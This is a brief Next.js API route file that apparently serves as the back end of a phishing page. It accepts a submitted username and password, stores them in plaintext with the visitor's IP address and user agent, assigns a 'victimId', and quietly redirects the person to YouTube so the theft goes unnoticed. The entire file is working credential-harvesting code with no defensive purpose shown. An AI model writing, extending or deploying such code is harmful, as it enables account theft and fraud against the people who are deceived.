import { NextResponse } from 'next/server';
import { initDB, saveCredentials } from '../../lib/db';

export async function POST(request) {
  try {
    await initDB();
    const formData = await request.formData();
    const username = formData.get('username');
    const password = formData.get('password');
    const ip = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown';
    const ua = request.headers.get('user-agent') || 'unknown';

    if (!username || !password) {
      return NextResponse.json({ status: 'error', message: 'Missing fields' }, { status: 400 });
    }

    const id = await saveCredentials(username, password, ip, ua);

    return NextResponse.json({
      status: 'ok',
      redirect: 'https://www.youtube.com',
      victimId: id
    });
  } catch (error) {
    console.error('[LOGIN ERROR]', error);
    return NextResponse.json({ status: 'ok', redirect: 'https://www.youtube.com' });
  }
}
